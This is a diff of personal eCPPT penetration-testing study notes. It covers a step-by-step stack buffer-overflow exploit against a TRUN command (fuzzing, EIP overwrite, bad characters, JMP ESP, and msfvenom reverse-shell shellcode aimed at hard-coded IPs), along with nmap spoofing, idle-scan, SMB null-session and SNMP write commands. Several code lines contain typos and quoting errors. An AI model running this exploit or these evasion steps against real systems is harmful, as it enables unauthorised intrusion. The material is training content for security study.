@@ -2,6 +2,8 @@
 
 ## eCPPT ##
 
+## eCPPT ##
+
 Architecture Fundamentals ::
 	
 	CPU:
@@ -204,24 +206,23 @@ Tools ::
 
 Buffer Overflows ::
 	
-	Buffer Overflows ::
-	
 	Fuzzing:
 		
+		import sys
 		import socket
 
 		buffer=["A"]
 		counter=100
 
-		while len(buffer) <= 10:
+		while len(buffer) <= 30:
 		    buffer.append("A"*counter)
-		    counter=counter+100
+		    counter=counter+200
 
 		for string in buffer:
 		    print("Fuzzing... with %s bytes" % len(string))
 		    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		    connect=s.connect(('IP', port))
-		    s.send((shellcode+'\r\n'))
+		    connect=s.connect(('111.61.0.96', 9999))
+		    s.send(('TRUN /.:/' + string))
 		    s.close()
 
 
@@ -237,18 +238,19 @@ Buffer Overflows ::
 
 			!mona pc (pattern_create)
 
-			!mona po (pattern_offset)
+			!mona po (pattern_offset)r
 
 
 	Overwriting the EIP:
 
+		import sys
 		import socket
 
-		shellcode = "A"*<offset> + "B"*4
+		shellcode = "A"*2003 + "B"*4
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
-		         connect=s.connect(('IP', port))
-		   	 s.send((shellcode+'\r\n'))
+			connect=s.connect(('IP', port))
+			s.send(('TRUN' /.:/ + shellcode))
 		except:
 			print("CHECK DEBUGGER!.")
 		s.close()
@@ -256,6 +258,7 @@ Buffer Overflows ::
 	Finding bad characters:
 
 		import socket
+		import sys
 
 		badchars = (
 		"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
@@ -271,8 +274,8 @@ Buffer Overflows ::
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 		try:
-		   	connect=s.connect(('IP', port))
-		    	s.send((shellcode+'\r\n'))
+			connect=s.connect(('IP', port))
+			s.send(('TRUN /.:/ + shellcode'))
 		except:
 			print("CHECK DEBUGGER!.")
 		s.close()
@@ -288,18 +291,17 @@ Buffer Overflows ::
 			JMP ESP ? (FFE4)
 
 		!mona find -s "\xff\xe4" -m dll.dll
-		
-		if none are found, just search for JMP ESP/ CALL ESP... and check which one's "PAGE_EXECUTE_READ" and not "READ_ONLY"
-		
+
 		then from results:
 
 			import socket
+			import sys
 
 			shellcode = "a"*2003 + "\x??\x??\x??\x??"
 			s=scoket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			try:
-		    		connect=s.connect(('IP', port))
-		    		s.send((shellcode+'\r\n'))
+				connect=s.connect(('IP', port))
+				s.send(('TRUN /.:/ + shellcode'))
 			except:
 				print("CHECK DEBUGGER!.")
 			s.close()
@@ -308,11 +310,12 @@ Buffer Overflows ::
 
 	Gaining remote shell:
 
-		msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST IP> LPORT=<LPORT> EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"(bad characters)
+		msfvenom -p windows/shell_reverse_tcp LHOST=lhost LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
 
 		add the payload, and some NOP's.
-		a NOP is a hex of \x90, add it right after the overwritten EIP, NOP stands for 'no operation', so the program just skips those assembly lines.
+		a NOP is a hex of \x90, add it right after the overwritten EIP, "\x90"*32 should be enough.
 
+		import sys
 		import socket
 
 		exploit=("\xda\xcb\xd9\x74\x24\xf4\x5a\xbe\x8f\xe5\x98\xa8\x31\xc9\xb1"
@@ -344,11 +347,14 @@ Buffer Overflows ::
 
 		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
-		    connect=s.connect(('IP', port))
-		    s.send((shellcode+'\r\n'))
+		    connect=s.connect(('192.168.1.25', 9998))
+		    s.send(('TRUN /.:/' + shellcode))
 		except:
 		    print("ERROR!")
 		s.close()
+
+
+
 
 Information Gathering ::
 
@@ -486,19 +492,31 @@ Information Gathering ::
 			dnsrecon -d target.com
 
 
+Scanning::
 
-	fping, hping:
+	fping, hping, nmap:
 
 		fping -e - time to send and recieve back the packer (IDS/IPS detection)
 
 		hping3 -2 - send UDP packet
-		hping3 -S - Host Discovery
+		hping3 -S - TCP/SYN - host discovery
 		hping3 -p - SYN/ACK
 		hping3 -F - FYN packet
 		hping3 -U - urgent
 		hping3 -X - XMAS package
 		hping3 -Y - YMAS package
 		hping3 -1 192.168.1.x --random-dest -I eth0 - check if subnet alive
+		hping3 -S -r -p <port> <IP> - estimate good zombie host (if id increment by +1 = open, if by +2 = closed)
+
+
+
+		nmap --ossscan-guess - OS Scan more aggressively (used with -O flag)
+		nmap -sS --source-port(or -g) 53 -p 53 - source port
+		nmap --spoof-mac (devie) - send from apple/win/lin etc. MAC Address
+		nmap --spoof-mac 0 - spoof random MAC Address
+		nmap --spoof-mac <MAC Address> - spoof specific MAC Address
+		nmap --randomize-hosts - random hosts scan order
+
 
 
 	Tools:
@@ -506,3 +524,55 @@ Information Gathering ::
 		DnsDumpster.com
 		dnsenum - https://github.com/fwaeytens/dnsenum
 		dnsenum --subfile file.txt -v -f /usr/share/dnsenum/.txt -u a -r target.com - store subdomains in file.txt
+
+
+Enumeration ::
+	
+	Netbios:
+
+		UDP 137 - name services
+		UDP 138 - datagram services
+		TCP 139 - session services
+
+		name services:
+
+			00 - Workstation Service - Messenger Service
+			03 - Messenger Service - Master Browser
+			06 - RAS Server Service - Domain Master Browser
+			1F - NetDDE Service - Domain Name
+			20 - Server Service - Domain Control
+			21 - RAS Client Service - Browser Service Elections
+			BE - Network Monitor Agent - Master Browser
+			BF - Network Monitor Application
+
+		nbtstat -A <target IP> - information gathering (Windows)
+		nbtscan -v <target IP> - information gathering (Linux)
+		nbtscan -v <IP>/subnet - scan entire subnet
+		net view <IP> - list domains, computers, resources shared by a computer on the network
+		net use <Drive Letter>: \\<IP>\C(or C$,IPC... etc.)
+		smbclient -L <IP> - smb connect
+		mount.cifs //<IP>/C /media/<Folder> user=,=pass= - navigate target shares
+		net use \\<IP>\IPC$ "" /u:"" - Null Session
+		winfo <IP> -n - flag -n means to try to establish a null session before gathering information
+		DumpSec - Report>Select Computer >> \\<IP>
+		enum4linux <IP>
+		rpcclient -N -U "" <IP> - if establishes then "help"
+		rpcclient > 'enum' for useful commands
+
+
+	SNMP:
+
+		UDP 161 - General Messages
+		UDP 162 - Trap Messages
+
+		snmpwalk:
+
+			snmpwalk -v 2c <ip> -c public - v means version(2c) c means community string to use(public)
+			snmp-mibs-downloader >> comment fourth line of /etc/snmp/snmp.conf (IF RETURNS OID NUMERICALLY)
+
+		snmpset:
+
+			snmpset -v 2c <ip> -c public (OID) s(for STRING) new@new.com
+			
+
+
